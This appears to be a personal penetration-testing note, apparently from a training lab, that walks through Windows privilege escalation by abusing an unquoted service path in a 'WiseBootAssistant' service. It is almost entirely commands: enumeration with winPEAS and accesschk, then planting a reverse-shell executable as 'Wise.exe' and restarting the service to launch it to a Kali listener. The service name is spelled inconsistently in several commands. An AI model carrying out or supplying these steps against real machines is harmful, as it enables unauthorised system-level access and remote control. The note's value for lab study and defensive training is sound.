1. Run winPEAS to check for service misconfigurations:

```command prompt - windows
.\winPEASx64.exe quiet servicesinfo
```

2. Note that the “unquotedsvc” service has an unquoted path that also contains spaces:

![[Pasted image 20220112132841.png | 1000]]

3. Confirm this using sc:
```command prompt - windows
sc qc WiseBootAssitant
```
4. Use accesschk.exe to check for write permissions:

```command prompt - windows
.\accesschk64.exe /accepteula -uwdq C:\
```

```command prompt - windows
.\accesschk64.exe /accepteula -uwdq "C:\Program Files (x86)\"
```

```command prompt - windows
.\accesschk64.exe /accepteula -uwdq "C:\Program Files (x86)\Wise\"
```

5. Copy the reverse shell executable and rename it appropriately:

[[1._Reverse Shells (WIN)#MSFVenom]]


![[Pasted image 20220112132935.png | 1000]]


```command prompt - windows
copy C:\PrivEsc\reverse.exe "C:\Program Files (x86)\Wise\Wise.exe"
```

6. Stop the service

```command prompt - windows
sc stop WiseBootAssistant
```

```command prompt - windows
sc query WiseBootAssitant
```

![[Pasted image 20220112133219.png | 1000]]

6. Start a listener on Kali, and then start the service to trigger the exploit:

![[rlwrap]]

```command prompt - windows
net start WiseBootAssitant
```

Visual example:

```command prompt - windows
.\winPEAS.exe quiet servicesinfo
```

![[Pasted image 20211229122911.png]]

```command prompt - windows
sc qc WiseBootAssistant
```

![[Pasted image 20211229122948.png]]

```command prompt - windows
.\accesschk64.exe /accepteula -ucqv Aaron WiseBootAssistant
```

```command prompt - windows
.\accesschk.exe /accepteula -uwdq C:\
```

```command prompt - windows
.\accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\"
```

```command prompt - windows
.\accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\Wise\"
```